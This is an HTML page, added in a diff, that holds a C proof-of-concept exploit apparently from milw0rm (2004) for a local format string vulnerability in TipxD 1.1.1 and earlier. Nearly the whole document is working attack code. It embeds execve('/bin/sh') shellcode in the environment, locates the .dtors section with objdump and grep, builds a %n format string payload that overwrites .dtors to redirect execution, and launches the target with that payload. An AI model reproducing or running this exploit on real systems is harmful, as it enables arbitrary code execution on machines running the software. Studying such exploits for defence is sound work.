@@ -1,0 +1,123 @@
+<html>
+<head>
+<title>TipxD <= 1.1.1 Local Format String Vulnerability (not setuid)</title>
+<pre>
+/* tipxd_exp.c
+
+TipxD Format String Vulnerability
+
+TipxD &lt;= 1.1.1 local exploit (Proof of Concept)
+
+Tested in Slackware 9.0 / 9.1 / 10.0
+
+by CoKi &lt;coki@nosystem.com.ar&gt; - SECU
+No System Group - http://www.nosystem.com.ar
+*/
+
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+#define PATH &quot;/bin/tipxd&quot;
+#define OBJDUMP &quot;/usr/bin/objdump&quot;
+#define GREP &quot;/usr/bin/grep&quot;
+
+unsigned char shellcode[]= /* aleph1 shellcode.45b */
+&quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c&quot;
+&quot;\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb&quot;
+&quot;\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e&quot;
+&quot;\x2f\x73\x68&quot;;
+
+int check(unsigned long addr);
+
+int main(int argc, char *argv[]) {
+
+int i, dtorsaddr;
+unsigned int bal1, bal2, bal3, bal4;
+char temp[512];
+char buffer[1024];
+char nop1[255], nop2[255];
+char nop3[255], nop4[255];
+int cn1, cn2, cn3, cn4;
+FILE *f;
+char *env[3] = {shellcode, NULL};
+int shaddr = 0xbffffffa - strlen(shellcode) - strlen(PATH);
+
+/* finding .dtors address */
+sprintf(temp, &quot;%s -s -j .dtors %s | %s ffffffff&quot;, OBJDUMP, PATH, GREP);
+f = popen(temp, &quot;r&quot;);
+if(fscanf(f, &quot; %08x&quot;, &amp;dtorsaddr) != 1) {
+pclose(f);
+printf(&quot;Cannot find .dtors address\n&quot;);
+exit(1);
+}
+pclose(f);
+dtorsaddr = dtorsaddr + 4;
+
+printf(&quot;\n TipxD &lt;= 1.1.1 local exploit (Proof of Concept)\n&quot;);
+printf(&quot; by CoKi &lt;coki@nosystem.com.ar&gt;\n\n&quot;);
+printf(&quot; shellcode address = %.8p\n&quot;, shaddr);
+printf(&quot; .dtors address = %.8p\n\n&quot;, dtorsaddr);
+
+bzero(temp, sizeof(temp));
+bzero(buffer, sizeof(buffer));
+
+strcat(buffer, &quot;x&quot;);
+
+/* adding .dtors address */
+for(i = 0; i &lt; 4; i++) {
+bzero(temp, sizeof(temp));
+sprintf(temp, &quot;%s&quot;, &amp;dtorsaddr);
+strncat(buffer, temp, 4);
+dtorsaddr++;
+}
+
+/* convert shellcode address location */
+memset(nop1, 0, 255);
+memset(nop2, 0, 255);
+memset(nop3, 0, 255);
+memset(nop4, 0, 255);
+
+bal1 = (shaddr &amp; 0xff000000) &gt;&gt; 24;
+bal2 = (shaddr &amp; 0x00ff0000) &gt;&gt; 16;
+bal3 = (shaddr &amp; 0x0000ff00) &gt;&gt; 8;
+bal4 = (shaddr &amp; 0x000000ff);
+
+cn1 = bal4 - 16 - 15 - 48 - 2 -1;
+cn1 = check(cn1);
+cn2 = bal3 - bal4 - 2;
+cn2 = check(cn2);
+cn3 = bal2 - bal3 - 2;
+cn3 = check(cn3);
+cn4 = bal1 - bal2 - 2;
+cn4 = check(cn4);
+
+memset(nop1, '\x90', cn1);
+memset(nop2, '\x90', cn2);
+memset(nop3, '\x90', cn3);
+memset(nop4, '\x90', cn4);
+
+sprintf(temp, &quot;%%08x%%08x%%08x%%08x%%08x%%08x&quot;
+&quot;%s\xeb\x02%%n&quot;
+&quot;%s\xeb\x02%%n&quot;
+&quot;%s\xeb\x02%%n&quot;
+&quot;%s\xeb\x02%%n\x90\x90\x90\x90&quot;
+,nop1, nop2, nop3, nop4);
+
+strcat(buffer, temp);
+
+execle(PATH, &quot;tipxd&quot;, &quot;-f&quot;, buffer, NULL, env);
+}
+
+int check(unsigned long addr) {
+char tmp[128];
+snprintf(tmp, sizeof(tmp), &quot;%d&quot;, addr);
+if(atoi(tmp) &lt; 1)
+addr = addr + 256;
+
+return addr;
+}
+
+// milw0rm.com [2004-12-14]
+</pre>
+</html>
+
